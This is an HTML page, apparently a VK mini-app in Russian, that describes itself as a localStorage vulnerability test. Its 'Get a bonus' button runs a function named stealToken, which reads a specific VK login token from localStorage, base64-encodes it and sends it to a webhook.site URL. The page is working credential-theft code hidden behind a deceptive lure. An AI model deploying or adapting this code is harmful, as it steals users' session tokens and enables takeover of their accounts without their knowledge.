<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #ebedf0; }
        button { background: #4a76a8; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; }
        button:hover { background: #3b5e85; }
        .info { margin-bottom: 20px; color: #555; }
    </script>
</head>
<body>

    <h1>Тестовое Мини-Приложение</h1>
    <p class="info">Нажми на кнопку ниже, чтобы проверить уязвимость localStorage</p>
    
    <button onclick="stealToken()">Получить бонус</button>

    <script>
        vkBridge.send('VKWebAppInit');

        function stealToken() {
            // Ключ именно от того приложения, которое мы проверяем
            const targetKey = '6287487:web_token:login:auth';
            const data = localStorage.getItem(targetKey);

            if (data) {
                // Если токен найден, отправляем его
                fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?stolen=' + btoa(data))
                .then(() => {
                    alert('Данные из localStorage успешно отправлены на ваш Webhook!');
                });
            } else {
                // Если вместо токена null
                alert('Ошибка: Токен не найден в localStorage. \n\nСначала откройте игру 51491054 в этом же браузере, чтобы токен сохранился!');
                
                // Для отчета: даже если пришел null, мы отправляем статус, чтобы видеть работу скрипта
                fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?error=null_data');
            }
        }
    </script>
</body>
</html>
